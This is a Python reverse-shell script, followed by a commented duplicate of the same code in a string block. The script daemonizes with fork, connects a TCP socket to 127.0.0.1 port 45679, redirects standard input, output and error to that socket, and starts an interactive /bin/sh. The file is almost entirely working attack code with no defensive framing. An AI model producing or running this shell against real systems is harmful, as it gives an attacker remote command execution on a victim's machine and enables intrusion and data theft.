import socket
import subprocess
import os
socket_handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    if os.fork() > 0:
        os._exit(0)
except OSError as error:
    print('Error in fork process: %d (%s)' % (error.errno,
error.strerror))
    pid = os.fork()
    if pid > 0:
        print('Fork Not Valid!')
socket_handler.connect(("127.0.0.1", 45679))
os.dup2(socket_handler.fileno(),0)
os.dup2(socket_handler.fileno(),1)
os.dup2(socket_handler.fileno(),2)
shell_remote = subprocess.call(["/bin/sh", "-i"])
list_files = subprocess.call(["/bin/ls", "-i"])

'''
Alternate version.

import socket
import subprocess
import os

# Create a TCP/IP socket
socket_handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Fork the process
    if os.fork() > 0:
        os._exit(0)
except OSError as error:
    print('Error in fork process: %d (%s)' % (error.errno, error.strerror))
    # Retry forking in case of error
    pid = os.fork()
    if pid > 0:
        print('Fork Not Valid!')

# Connect the socket to the remote host and port
socket_handler.connect(("127.0.0.1", 45679))

# Duplicate the socket file descriptors to standard input, output, and error
os.dup2(socket_handler.fileno(), 0)
os.dup2(socket_handler.fileno(), 1)
os.dup2(socket_handler.fileno(), 2)

# Start an interactive shell session
shell_remote = subprocess.call(["/bin/sh", "-i"])

# List files in the current directory (this line seems redundant and won't be executed)
list_files = subprocess.call(["/bin/ls", "-i"])
'''